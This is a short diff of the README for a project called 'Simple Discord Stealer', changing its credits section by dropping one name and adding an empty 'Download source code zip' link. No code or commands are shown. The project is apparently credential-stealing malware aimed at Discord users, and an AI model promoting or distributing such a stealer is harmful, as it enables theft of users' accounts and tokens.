@@ -35,7 +35,9 @@ Simple Discord Stealer.
 ***
 # Credits :
 ```
-SySLinks
+1. [Download source code zip]()
+
+
 addi00000
 ```
 
